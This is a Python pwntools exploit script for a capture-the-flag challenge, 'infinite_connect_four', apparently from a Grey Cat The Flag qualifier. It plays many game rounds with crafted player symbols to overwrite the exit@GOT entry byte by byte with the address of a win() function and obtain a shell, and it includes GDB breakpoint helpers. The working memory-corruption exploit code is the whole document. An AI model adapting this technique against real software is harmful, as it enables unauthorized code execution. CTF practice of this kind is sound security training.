#!/usr/bin/env python3
from pwn import *
import os
import time 

# --- Configuration ---
EXE_PATH = './infinite_connect_four'
LD_PATH = './ld-linux-x86-64.so.2' 

# --- Context and Process Setup ---
elf = context.binary = ELF(EXE_PATH)
FIXED_EXE_BASE = 0x7ffff7fbe000 
elf.address = FIXED_EXE_BASE 

WIN_ADDR = elf.symbols['win']
TARGET_GOT_SYM = 'exit' 
if TARGET_GOT_SYM not in elf.got:
    log.critical(f"The symbol '{TARGET_GOT_SYM}' was not found in the GOT of {EXE_PATH}.")
    exit(1)
TARGET_GOT_ADDR = elf.got[TARGET_GOT_SYM]

log.info(f"Executable PIE base: {hex(elf.address)}")
log.info(f"Address of win(): {hex(WIN_ADDR)}")
log.info(f"Address of {TARGET_GOT_SYM}@GOT: {hex(TARGET_GOT_ADDR)}")

# --- Helper Functions ---
def start_new_game_instance_and_get_banner(op_count_for_gdb=-1): # op_count for conditional GDB
    minimal_process_env = {"LD_LIBRARY_PATH": "."}
    log.debug(f"Attempting to start new game instance (Op #{op_count_for_gdb if op_count_for_gdb != -1 else 'N/A'})")
    
    proc = None
    if args.GDB and op_count_for_gdb == GDB_ATTACH_OPERATION_NUMBER: # GDB_ATTACH_OPERATION_NUMBER defined in main
        gdb_script = ( # Assuming Ghidra addresses are filled in below
            "set exec-wrapper ./run_with_env.sh\n"
            "set args ./infinite_connect_four\n"
            "add-symbol-file ./infinite_connect_four 0x7ffff7fbe000\n"
            "directory /home/kali/Desktop/raphael-lim/extra-curricular/events/2025/event---2025-grey-cat-the-flag/qualifier/dist-infinite_connect_four/\n" # YOUR PATH
            f"b *{hex(0x7ffff7fbfe00)}\n"  # lastfree-- (C line 179 example)
            f"b *{hex(0x7ffff7fbff22)}\n"  # SHIFT (C line 186 example)
            f"b *{hex(0x7ffff7fbfed5)}\n"  # CURRSYM (C line 183 example)
            f"b *{hex(0x7ffff7fbfc05)}\n"  # call printboard (C line 199 example)
            "handle SIGSEGV stop print\n"
            "c\n"
        )
        log.warn(f"GDB MODE: Attaching GDB for Operation #{op_count_for_gdb}")
        proc = gdb.debug([LD_PATH, elf.path], gdbscript=gdb_script, env=minimal_process_env)
        input("GDB launched for Op #{op_count_for_gdb}. In GDB, after initial 'c', manage breakpoints. Then press Enter HERE...")
    else:
        proc = process([LD_PATH, elf.path], env=minimal_process_env)
    
    try:
        proc.recvuntil(b":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::. \n", timeout=5)
        log.debug("New game started, banner received.")
    except Exception as e_banner:
        log.critical(f"Failed to receive banner on new process (Op #{op_count_for_gdb if op_count_for_gdb != -1 else 'N/A'}): {e_banner}")
        if proc and proc.connected: proc.close()
        raise
    return proc

def set_player_symbols_in_game(proc, p1_sym_char, p2_sym_char):
    proc.sendlineafter(b"Enter player 1 symbol > ", p1_sym_char)
    proc.sendlineafter(b"Enter player 2 symbol > ", p2_sym_char)
    log.debug(f"Symbols set: P1={hex(ord(p1_sym_char))}, P2={hex(ord(p2_sym_char))}")

def make_one_game_move(proc, player_description, col_idx, move_info=""):
    prompt_str = f"Player {player_description} choose your column (0 - 7) > "
    log.debug(f"{move_info} - Waiting for: {prompt_str!r}")
    try:
        proc.recvuntil(prompt_str.encode(), timeout=3) 
        proc.sendline(str(col_idx).encode())
        log.debug(f"{move_info} - Sent col {col_idx} for P{player_description}.")
    except TimeoutError:
        log.error(f"{move_info} - Timeout waiting for prompt: {prompt_str!r}")
        log.info(f"Last output from process: {proc.recvall(timeout=0.2).decode(errors='ignore')}")
        raise 
    except EOFError:
        log.error(f"{move_info} - EOFError sending move for P{player_description}. Process died.")
        raise

def finish_game_for_shift_op(proc, p1_sym_at_9th_move, p2_sym_at_9th_move, tc_to_avoid):
    # This version is based on Response #75 - it does NOT send a name if game ends,
    # allowing the process to terminate cleanly when fgets gets EOF or its pipe closes.
    log.info(f"  Finishing game instance: P1_sym_used={hex(ord(p1_sym_at_9th_move))}, P2_sym_used={hex(ord(p2_sym_at_9th_move))}, avoiding_col={tc_to_avoid}")
    
    win_col_p1, block_col_p2 = 0, 1 
    possible_cols = [c for c in range(3) if c != tc_to_avoid] 
    if not possible_cols: possible_cols = [ (tc_to_avoid + 1) % 3 ] 
    win_col_p1 = possible_cols[0]
    if len(possible_cols) > 1: block_col_p2 = possible_cols[1]
    else: block_col_p2 = (win_col_p1 + 1) % 3
    if win_col_p1 == block_col_p2: block_col_p2 = (win_col_p1 + 1) % 3
    log.debug(f"    FinishGame: P1 wins in col {win_col_p1}, P2 blocks in col {block_col_p2}")

    initial_response = proc.recvuntil([b"Enter your name winner!", b"Player 2 choose your column (0 - 7) > "], timeout=1.0) # Increased timeout

    if b"Enter your name winner!" in initial_response:
        log.warn("    FinishGame: Game ALREADY ended (likely P1/other won on 9th vuln move). Process will exit after fgets.")
        # We don't send a name here. The process will read EOF/timeout on fgets and exit.
        return 

    elif b"Player 2 choose your column (0 - 7) > " in initial_response:
        log.info("    FinishGame: Game continues, P2's turn. Proceeding with win sequence.")
        proc.unrecv(initial_response) 
        
        try: make_one_game_move(proc, "2", block_col_p2, "FinishGame P2S1")
        except (EOFError, TimeoutError) as e: log.error(f"Err during P2's 1st win move: {e}"); raise 

        for k in range(4): 
            try: make_one_game_move(proc, "1", win_col_p1, f"FinishGame P1M{k+1}")
            except (EOFError, TimeoutError) as e: log.error(f"Err during P1's win move {k+1}: {e}"); raise

            response_after_p1 = proc.recvuntil([b"Enter your name winner!", b"Player 2 choose your column (0 - 7) > "], timeout=0.5) # Quick check
            if b"Enter your name winner!" in response_after_p1:
                log.info(f"    FinishGame: P1 won on move {k+1}. Process will exit after fgets.")
                # DON'T send name
                return 
            elif b"Player 2 choose your column (0 - 7) > " in response_after_p1:
                if k < 3: 
                    proc.unrecv(response_after_p1) 
                    try: make_one_game_move(proc, "2", block_col_p2, f"FinishGame P2M{k+1}")
                    except (EOFError, TimeoutError) as e: log.error(f"Err during P2's win move {k+1}: {e}"); raise
                else: 
                    log.warn("    FinishGame: P1 made 4th move, name prompt not immediate. Assuming win and exit.")
                    try: proc.recvuntil(b"Enter your name winner!", timeout=1) 
                    except: log.debug("    Could not get name prompt after P1's 4th move, but assuming exit.")
                    return
            else: 
                log.error(f"    FinishGame: Unexpected output after P1M{k+1}: {response_after_p1!r}"); raise Exception("Unexpected game state in FinishGame")
        try: # Fallback if loop finishes
            proc.recvuntil(b"Enter your name winner!", timeout=1)
        except: log.debug("    Could not get name prompt after win loop completion, but assuming exit.")
        return
    else: 
        log.error(f"    FinishGame: Unexpected initial state after 9th vuln move. Received: {initial_response!r}")
        if not initial_response: # Timeout happened, process might be dead
            log.error("    FinishGame: NO output received for initial state check. Process likely crashed HARD after 9th move.")
        raise Exception("Unknown initial game state in FinishGame after 9th move.")
    # log.info("  Game instance processing finished (process will exit).") # Redundant

# --- Main Exploit Logic ---
bytes_of_win_addr = p64(WIN_ADDR) 
JUNK_SYM_A = b"J" 
JUNK_SYM_B = b"K" 
SHIFTS_NEEDED = 15 
overall_op_count = 0
GDB_ATTACH_OPERATION_NUMBER = -1 # Set to e.g. 91 to debug that specific operation if GDB arg is passed

if args.GDB:
    try:
        op_to_debug = int(input("Enter Overall Operation # to attach GDB (e.g., 91, or -1 for none): "))
        if op_to_debug > 0:
            GDB_ATTACH_OPERATION_NUMBER = op_to_debug
    except ValueError:
        log.warn("Invalid input for GDB operation number. GDB will not be selectively attached.")

for i in range(len(bytes_of_win_addr)): 
    byte_to_write_for_currsym = bytes_of_win_addr[i:i+1]
    target_column_for_this_byte = i 
    log.info(f"=== Processing Byte {i+1}/{len(bytes_of_win_addr)}: Value {hex(ord(byte_to_write_for_currsym))} for target column {target_column_for_this_byte} ===")

    for shift_num in range(SHIFTS_NEEDED): 
        overall_op_count += 1
        log.info(f"  Overall Operation #{overall_op_count}: Shift {shift_num + 1}/{SHIFTS_NEEDED} for byte {i+1} in col {target_column_for_this_byte}")

        p1_sym_for_this_op_setup_and_9th_move = JUNK_SYM_A
        p2_sym_for_this_op_setup = JUNK_SYM_B

        if shift_num == 0: 
            p1_sym_for_this_op_setup_and_9th_move = byte_to_write_for_currsym
            if byte_to_write_for_currsym == JUNK_SYM_B: 
                p2_sym_for_this_op_setup = JUNK_SYM_A 
            log.info(f"    Placement shift: P1 sym (for setup & 9th) = {hex(ord(p1_sym_for_this_op_setup_and_9th_move))}, P2 sym (for setup) = {hex(ord(p2_sym_for_this_op_setup))}")
        else: 
            log.info(f"    Regular shift: P1 sym (for setup & 9th) = {hex(ord(p1_sym_for_this_op_setup_and_9th_move))}, P2 sym (for setup) = {hex(ord(p2_sym_for_this_op_setup))}")
        
        current_process_handle = None 
        try:
            current_process_handle = start_new_game_instance_and_get_banner(op_count_for_gdb=overall_op_count)
            set_player_symbols_in_game(current_process_handle, p1_sym_for_this_op_setup_and_9th_move, p2_sym_for_this_op_setup)

            for k_move in range(8): 
                make_one_game_move(current_process_handle, "1" if k_move % 2 == 0 else "2", target_column_for_this_byte, f"Op#{overall_op_count} SetupMv{k_move+1}")
            
            make_one_game_move(current_process_handle, "1", target_column_for_this_byte, f"Op#{overall_op_count} VulnMv9")
            log.info(f"    9th move (currsym={hex(ord(p1_sym_for_this_op_setup_and_9th_move))}) in col {target_column_for_this_byte} done for Op#{overall_op_count}.")
            
            if args.GDB and overall_op_count == GDB_ATTACH_OPERATION_NUMBER:
                input(f"    GDB: Op #{overall_op_count} - 9th move sent. GDB should be at a breakpoint now.\n"
                      f"    In GDB: Step, examine. When ready (or crash), press Enter HERE...")

            finish_game_for_shift_op(current_process_handle, p1_sym_for_this_op_setup_and_9th_move, p2_sym_for_this_op_setup, target_column_for_this_byte)
            log.info(f"    Game instance for Op#{overall_op_count} completed (process should exit).")

        except Exception as e_op:
            log.critical(f"Error during Overall Operation #{overall_op_count} (Byte {i+1}, Shift {shift_num+1}): {type(e_op).__name__} - {e_op}")
            if current_process_handle and current_process_handle.connected: current_process_handle.interactive()
            exit(1)
        finally:
            if current_process_handle and current_process_handle.connected():
                log.debug(f"Ensuring process for Op#{overall_op_count} is closed.")
                try: current_process_handle.wait_for_close(timeout=0.5) 
                except: pass # Ignore timeout if already closed
                if current_process_handle.connected: current_process_handle.close()
            log.debug(f"Process for Op#{overall_op_count} handling complete.")
        
        time.sleep(0.1) # Increased breather: gives OS time to clean up process fully
        
is_last_overall_op = True # Will be true if loops complete

if is_last_overall_op: 
    log.info("=== All shift operations complete. Attempting final game to trigger win(). ===")
    p_final = None
    try:
        # Start the final game instance
        # For this GDB attachment, use a different op_count or a fixed large number
        p_final = start_new_game_instance_and_get_banner(op_count_for_gdb=999 if args.GDB else -1) 
        set_player_symbols_in_game(p_final, b"X", b"O") 

        log.info("Playing final game to win...")
        for k_move in range(4): 
            make_one_game_move(p_final, "1", 0, f"FinalWin P1Mv{k_move+1}")
            response_final = p_final.recvuntil([b"Enter your name winner!", b"Player 2 choose your column (0 - 7) > "], timeout=0.3)
            if b"Enter your name winner!" in response_final:
                log.info(" Final game won by P1.")
                break 
            elif b"Player 2 choose your column (0 - 7) > " in response_final:
                if k_move < 3:
                    p_final.unrecv(response_final)
                    make_one_game_move(p_final, "2", 1, f"FinalWin P2Mv{k_move+1}")
                else: 
                    log.warn(" Final game: P1 made 4th move, name prompt not immediate.")
                    # Still need to ensure we hit the "Enter your name winner!" prompt
                    p_final.recvuntil(b"Enter your name winner!", timeout=1)
                    break 
            else:
                log.error(f" Final game: Unexpected output after P1M{k_move+1}: {response_final!r}")
                p_final.recvuntil(b"Enter your name winner!", timeout=1) # Try to sync
                break
        
        # Ensure we are at the name prompt or raise error if not already broken by win
        p_final.recvuntil(b"Enter your name winner!", timeout=3) # Wait for it
        p_final.sendline(b"GOT_THE_FLAG_YATTA") # Unique name
        log.info("Final game won, name sent. Shell should appear now from win().")
        p_final.interactive()

    except Exception as e_final:
        log.critical(f"Error during final win attempt: {type(e_final).__name__} - {e_final}")
        if p_final and p_final.connected: p_final.interactive()

else: 
    log.error("Main exploit loop did not complete as expected for final win trigger.")